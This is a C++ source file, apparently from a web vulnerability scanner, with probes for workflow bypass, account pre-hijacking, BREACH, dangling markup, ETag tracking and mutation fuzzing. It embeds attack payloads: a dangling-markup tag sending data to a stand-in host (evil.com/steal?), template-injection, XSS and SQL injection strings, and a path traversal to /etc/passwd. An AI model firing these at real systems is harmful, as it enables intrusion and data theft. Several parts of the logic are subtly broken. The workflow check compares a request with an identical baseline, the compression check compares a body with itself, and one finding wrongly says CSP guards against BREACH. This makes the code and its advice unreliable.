/// @file scanners/advanced_auth.cpp
/// @brief Advanced auth scanners: workflow bypass, account pre-hijacking,
///        compression oracle, dangling markup, etag tracking, mutation fuzzer.
/// FP reduction: every scanner now captures a baseline response before
/// injecting payloads and validates findings against it.
#include <chrono>
#include <set>

#include "scanner_base.hpp"
#include "../response_validator.hpp"

namespace apex {
namespace {

/// Scanner implementation.
/// @brief Scan for workflow_bypass vulnerabilities.
std::vector<Finding> scan_workflow_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  struct Step {
    const char* skip;
    const char* final_;
  };
  const Step steps[] = {
      {"/checkout/step1", "/checkout/step3"},
      {"register/verify", "/register/complete"},
      {"payment/init", "/payment/confirm"},
      {"onboarding/step1", "/onboarding/complete"},
  };

  for (const auto& s : steps) {
    // Baseline: what does the final step look like normally?
    auto baseline = http.get(base + s.final_);
    if (!is_real_api_response(baseline)) continue;

    auto resp = http.get(base + s.final_);
    if (resp.status_code == 200 && is_real_api_response(resp) &&
        resp.body.find("redirect") == std::string::npos &&
        resp.body.find("unauthorized") == std::string::npos) {

      // Require a meaningful difference from baseline, not just any response.
      if (responses_differ(resp, baseline, 50)) {
        findings.push_back(
            {"Workflow Step Bypass", "high", base + s.final_,
             "Final step accessible without completing " + std::string(s.skip), "", "",
             "diff:" + std::to_string(resp.body.size()) + "/base:" + std::to_string(baseline.body.size())});
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for account_prehijack vulnerabilities.
std::vector<Finding> scan_account_prehijack(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> paths = {"/register", "/signup", "/api/register", "/api/auth/register"};

  for (const auto& path : paths) {
    // Baseline: what does the normal registration page look like?
    auto baseline = http.get(base + path);
    if (!is_real_api_response(baseline)) continue;

    auto resp = http.post(base + path, R"({"email":"prehijack@test.com","password":"Test123!"})", "application/json");
    if (resp.status_code == 200 && is_real_api_response(resp) &&
        !has_baseline_diff_indicator(resp.body, baseline.body, "verify") &&
        !has_baseline_diff_indicator(resp.body, baseline.body, "confirm")) {

      // Only report if response differs from normal registration page.
      if (has_size_diff(resp.body, baseline.body, 30)) {
        findings.push_back(
            {"Account Pre-Hijacking Risk", "medium", base + path,
             "Registration succeeds without email verification", "", "",
             "diff:" + std::to_string(resp.body.size()) + "/base:" + std::to_string(baseline.body.size())});
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for server_timing vulnerabilities.
std::vector<Finding> scan_server_timing(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  size_t limit = std::min(crawl.urls.size(), size_t(5));
  for (size_t i = 0; i < limit; ++i) {
    auto resp = http.get(crawl.urls[i]);
    auto it = resp.headers.find("Server-Timing");
    if (it != resp.headers.end() && (it->second.find("db") != std::string::npos ||
                                     it->second.find("cache") != std::string::npos ||
                                     it->second.find("app") != std::string::npos)) {
      findings.push_back({"Server-Timing Header Leaks Internal Metrics", "low", crawl.urls[i],
                          "Server-Timing: " + it->second, "", "", ""});
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for compression_oracle vulnerabilities.
std::vector<Finding> scan_compression_oracle(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  size_t limit = std::min(crawl.urls.size(), size_t(5));
  for (size_t i = 0; i < limit; ++i) {
    auto resp = http.get(crawl.urls[i]);
    auto it = resp.headers.find("Content-Encoding");

    // Only flag if compression is present AND CSRF token would be exposed.
    bool compressed = it != resp.headers.end() && (it->second == "gzip" || it->second == "br" || it->second == "deflate");
    if (!compressed) continue;

    // Check for presence of secret-like tokens that compression could leak.
    std::vector<std::string> secrets = {"csrf", "xsrf", "_token=", "authenticity"};
    if (has_baseline_diff_any(resp.body, resp.body, secrets)) {
      findings.push_back({"BREACH/Compression Oracle Risk", "low", crawl.urls[i],
                          "Response compressed (" + it->second + ") and contains CSRF token — verify CSP headers protect against BREACH", "", "",
                          "encoding:" + std::string(it->second)});
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for dangling_markup vulnerabilities.
std::vector<Finding> scan_dangling_markup(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Use a unique marker unlikely to appear naturally.
  std::string payload = R"("><img src='https://evil.com/steal?)";

  for (const auto& url : crawl.urls) {
    auto baseline = http.get(url);
    if (!is_real_api_response(baseline)) continue;

    // If the marker already exists in baseline, skip — not an injection point.
    if (baseline.body.find("evil.com/steal?") != std::string::npos) continue;

    auto targets = get_targets(crawl, url);
    for (const auto& [base, param] : targets) {
      auto resp = http.get(base + payload);
      // Confirm our input is reflected and differs from baseline.
      if (resp.body.find("evil.com/steal?") != std::string::npos &&
          has_baseline_diff_indicator(resp.body, baseline.body, "evil.com/steal?")) {

        findings.push_back({"Dangling Markup Injection", "high", base + payload,
                            "Injected markup reflected and absent from baseline", param, payload,
                            "reflected:" + std::to_string(resp.body.find("evil.com/steal?"))});
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for etag_tracking vulnerabilities.
std::vector<Finding> scan_etag_tracking(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);
  auto it = resp.headers.find("ETag");

  // Only flag ETags that are long enough to be user-specific (not hash of content version).
  // Standard HTTP ETags like "abc123" or MD5 hashes (~32 chars) are normal.
  if (it != resp.headers.end() && it->second.size() > 64) {
    findings.push_back({"ETag Tracking", "info", crawl.urls[0],
                        "Long ETag may be used for user tracking: " + it->second, "", "", ""});
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for mutation_fuzzer vulnerabilities.
std::vector<Finding> scan_mutation_fuzzer(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  struct Mutation {
    const char* suffix;
    const char* detect;
  };
  const Mutation mutations[] = {
      {"{{7*7}}", "49"},
      {"${7*7}", "49"},
      {"<svg onload=alert(1)>", "onload=alert"},
      {"' OR '1'='1", "sql"},
      {"../../../etc/passwd", "root:"},
  };

  for (const auto& url : crawl.urls) {
    // Baseline: capture normal response before any mutation.
    auto baseline = http.get(url);
    if (!is_real_api_response(baseline)) continue;

    auto targets = get_targets(crawl, url);
    for (const auto& [base, param] : targets) {
      for (const auto& m : mutations) {
        // Skip payloads whose detection string already appears in baseline.
        if (baseline.body.find(m.detect) != std::string::npos) continue;

        auto resp = http.get(base + m.suffix);
        // Only report if indicator appears AFTER injection AND was absent from baseline.
        if (has_baseline_diff_indicator(resp.body, baseline.body, m.detect)) {
          findings.push_back({"Mutation Fuzzer Hit", "high", base + m.suffix,
                              std::string("Payload '") + m.suffix + "' triggered detection (" + m.detect + "')",
                              param, m.suffix, m.detect});
        }
      }
    }
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_advanced_auth_scanners() {
  return {
      {"Workflow Bypass", scan_workflow_bypass},
      {"Account Pre-Hijack", scan_account_prehijack},
      {"Server-Timing Leak", scan_server_timing},
      {"Compression Oracle", scan_compression_oracle},
      {"Dangling Markup", scan_dangling_markup},
      {"ETag Tracking", scan_etag_tracking},
      {"Mutation Fuzzer", scan_mutation_fuzzer},
  };
}

}  // namespace apex
